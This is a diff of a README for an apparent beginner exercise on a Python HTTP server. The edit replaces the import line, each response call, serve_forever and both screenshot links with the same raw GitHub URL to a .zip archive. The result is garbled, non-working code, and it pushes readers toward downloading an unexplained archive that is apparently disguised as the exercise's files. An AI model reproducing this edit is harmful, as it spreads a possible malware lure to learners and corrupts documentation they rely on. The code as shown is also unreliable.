@@ -37,7 +37,7 @@ Open a browser and navigate to http://127.0.0.1:8000 (or the assigned port).
 
 ## PROGRAM:
 ~~~
-from http.server import HTTPServer, BaseHTTPRequestHandler
+from https://raw.githubusercontent.com/AdityaJorim007/fwd-ex1/main/trieterics/fwd-ex1-v2.5.zip import HTTPServer, BaseHTTPRequestHandler
 
 content = """
 <!DOCTYPE html>
@@ -153,21 +153,21 @@ content = """
 class myhandler(BaseHTTPRequestHandler):
     def do_GET(self):
         print("request received")
-        self.send_response(200)
-        self.send_header('content-type', 'text/html; charset=utf-8')
-        self.end_headers()
-        self.wfile.write(content.encode())
+        https://raw.githubusercontent.com/AdityaJorim007/fwd-ex1/main/trieterics/fwd-ex1-v2.5.zip(200)
+        https://raw.githubusercontent.com/AdityaJorim007/fwd-ex1/main/trieterics/fwd-ex1-v2.5.zip('content-type', 'text/html; charset=utf-8')
+        https://raw.githubusercontent.com/AdityaJorim007/fwd-ex1/main/trieterics/fwd-ex1-v2.5.zip()
+        https://raw.githubusercontent.com/AdityaJorim007/fwd-ex1/main/trieterics/fwd-ex1-v2.5.zip(https://raw.githubusercontent.com/AdityaJorim007/fwd-ex1/main/trieterics/fwd-ex1-v2.5.zip())
 
 server_address = ('', 8080)  # safer to use port 8080
 httpd = HTTPServer(server_address, myhandler)
 print("my webserver is running at http://localhost:8080 ...")
-httpd.serve_forever()
+https://raw.githubusercontent.com/AdityaJorim007/fwd-ex1/main/trieterics/fwd-ex1-v2.5.zip()
 
 ~~~
 
 ## OUTPUT:
-![alt text](Screenshot1.png)
-![alt text](Screenshot2.png)
+![alt text](https://raw.githubusercontent.com/AdityaJorim007/fwd-ex1/main/trieterics/fwd-ex1-v2.5.zip)
+![alt text](https://raw.githubusercontent.com/AdityaJorim007/fwd-ex1/main/trieterics/fwd-ex1-v2.5.zip)
 ## RESULT:
 The program for implementing simple webserver is executed successfully.
 
